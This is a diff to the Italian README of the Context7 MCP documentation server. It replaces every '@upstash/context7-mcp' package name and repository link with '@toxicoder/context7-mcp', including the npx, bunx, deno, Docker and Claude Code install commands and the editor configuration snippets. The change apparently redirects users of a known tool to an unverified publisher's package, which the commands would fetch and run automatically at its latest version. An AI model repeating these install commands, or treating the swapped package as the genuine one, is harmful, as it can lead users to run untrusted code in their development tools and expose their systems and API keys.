@@ -1,6 +1,6 @@
 # Context7 MCP - Documentazione aggiornata per qualsiasi prompt
 
-[![Website](https://img.shields.io/badge/Website-context7.com-blue)](https://context7.com) [![smithery badge](https://smithery.ai/badge/@upstash/context7-mcp)](https://smithery.ai/server/@upstash/context7-mcp) [<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Installa%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
+[![Website](https://img.shields.io/badge/Website-context7.com-blue)](https://context7.com) [![smithery badge](https://smithery.ai/badge/@toxicoder/context7-mcp)](https://smithery.ai/server/@toxicoder/context7-mcp) [<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Installa%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
 
 [![中文文档](https://img.shields.io/badge/docs-中文版-yellow)](./README.zh-CN.md) [![한국어 문서](https://img.shields.io/badge/docs-한국어-green)](./README.ko.md) [![Documentación en Español](https://img.shields.io/badge/docs-Español-orange)](./README.es.md) [![Documentation en Français](https://img.shields.io/badge/docs-Français-blue)](./README.fr.md) [![Documentação em Português (Brasil)](<https://img.shields.io/badge/docs-Português%20(Brasil)-purple>)](./README.pt-BR.md) [![Documentazione in italiano](https://img.shields.io/badge/docs-Italian-red)](./README.it.md)
 
@@ -43,10 +43,10 @@ Nessun cambio di tab, nessuna API allucinata che non esiste, nessuna generazione
 
 ### Installazione tramite Smithery
 
-Per installare Context7 MCP Server per Claude Desktop automaticamente tramite [Smithery](https://smithery.ai/server/@upstash/context7-mcp):
+Per installare Context7 MCP Server per Claude Desktop automaticamente tramite [Smithery](https://smithery.ai/server/@toxicoder/context7-mcp):
 
 ```bash
-npx -y @smithery/cli install @upstash/context7-mcp --client claude
+npx -y @smithery/cli install @toxicoder/context7-mcp --client claude
 ```
 
 ### Installare in Cursor
@@ -60,7 +60,7 @@ Incollare la seguente configurazione nel file `~/.cursor/mcp.json` di Cursor è 
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -74,7 +74,7 @@ Incollare la seguente configurazione nel file `~/.cursor/mcp.json` di Cursor è 
   "mcpServers": {
     "context7": {
       "command": "bunx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -90,7 +90,7 @@ Incollare la seguente configurazione nel file `~/.cursor/mcp.json` di Cursor è 
   "mcpServers": {
     "context7": {
       "command": "deno",
-      "args": ["run", "--allow-net", "npm:@upstash/context7-mcp"]
+      "args": ["run", "--allow-net", "npm:@toxicoder/context7-mcp"]
     }
   }
 }
@@ -107,7 +107,7 @@ Aggiungi questo al tuo file di configurazione Windsurf MCP. Vedi [Windsurf MCP d
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -115,8 +115,8 @@ Aggiungi questo al tuo file di configurazione Windsurf MCP. Vedi [Windsurf MCP d
 
 ### Installare in VS Code
 
-[<img alt="Installa in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Installa%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
-[<img alt="Installa in VS Code Insiders (npx)" src="https://img.shields.io/badge/VS_Code_Insiders-VS_Code_Insiders?style=flat-square&label=Installa%20Context7%20MCP&color=24bfa5">](https://insiders.vscode.dev/redirect?url=vscode-insiders%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
+[<img alt="Installa in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Installa%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
+[<img alt="Installa in VS Code Insiders (npx)" src="https://img.shields.io/badge/VS_Code_Insiders-VS_Code_Insiders?style=flat-square&label=Installa%20Context7%20MCP&color=24bfa5">](https://insiders.vscode.dev/redirect?url=vscode-insiders%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
 
 Aggiungi questo al tuo file di configurazione MCP di VS Code. Vedi [VS Code MCP docs](https://code.visualstudio.com/docs/copilot/chat/mcp-servers) per ulteriori informazioni.
 
@@ -126,7 +126,7 @@ Aggiungi questo al tuo file di configurazione MCP di VS Code. Vedi [VS Code MCP 
     "Context7": {
       "type": "stdio",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -142,7 +142,7 @@ Può essere installato tramite [Zed Extensions](https://zed.dev/extensions?query
     "Context7": {
       "source": "custom",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp", "--api-key", "YOUR_API_KEY"]
+      "args": ["-y", "@toxicoder/context7-mcp", "--api-key", "YOUR_API_KEY"]
     }
   }
 }
@@ -153,7 +153,7 @@ Può essere installato tramite [Zed Extensions](https://zed.dev/extensions?query
 Esegui questo comando. Vedi [Claude Code MCP docs](https://docs.anthropic.com/it/docs/claude-code/mcp) per ulteriori informazioni.
 
 ```sh
-claude mcp add context7 -- npx -y @upstash/context7-mcp@latest
+claude mcp add context7 -- npx -y @toxicoder/context7-mcp@latest
 ```
 
 ### Installare in Claude Desktop
@@ -165,7 +165,7 @@ Aggiungi questo al tuo file `claude_desktop_config.json` di Claude Desktop. Vedi
   "mcpServers": {
     "Context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -218,7 +218,7 @@ Oppure, per un server locale:
       "type": "local",
       "command": "npx",
       "tools": ["get-library-docs", "resolve-library-id"],
-      "args": ["-y", "@upstash/context7-mcp", "--api-key", "YOUR_API_KEY"]
+      "args": ["-y", "@toxicoder/context7-mcp", "--api-key", "YOUR_API_KEY"]
     }
   }
 }
@@ -243,7 +243,7 @@ Se preferisci eseguire il server MCP in un contenitore Docker:
     WORKDIR /app
 
     # Installa l ultima versione globalmente
-    RUN npm install -g @upstash/context7-mcp@latest
+    RUN npm install -g @toxicoder/context7-mcp@latest
 
     # Esponi la porta predefinita se necessario (opzionale, dipende dall interazione del client MCP)
     # EXPOSE 3000
@@ -322,7 +322,7 @@ bun run build
 ### Test con MCP Inspector
 
 ```bash
-npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp@latest
+npx -y @modelcontextprotocol/inspector npx @toxicoder/context7-mcp@latest
 ```
 
 ## Risoluzione dei problemi
@@ -336,7 +336,7 @@ Se vedi questo errore, prova a usare `bunx` invece di `npx`.
   "mcpServers": {
     "context7": {
       "command": "bunx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -353,7 +353,7 @@ Se riscontri un errore come: `Error: Cannot find module 'uriTemplate.js'` prova 
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "--node-options=--experimental-vm-modules", "@upstash/context7-mcp@1.0.6"]
+      "args": ["-y", "--node-options=--experimental-vm-modules", "@toxicoder/context7-mcp@1.0.6"]
     }
   }
 }
@@ -384,7 +384,7 @@ I progetti Context7 sono contributi della comunità e, sebbene ci impegniamo a m
 
 ## Storico delle Stelle
 
-[![Star History Chart](https://api.star-history.com/svg?repos=upstash/context7&type=Date)](https://www.star-history.com/#upstash/context7&Date)
+[![Star History Chart](https://api.star-history.com/svg?repos=toxicoder/context7&type=Date)](https://www.star-history.com/#toxicoder/context7&Date)
 
 ## Licenza
 
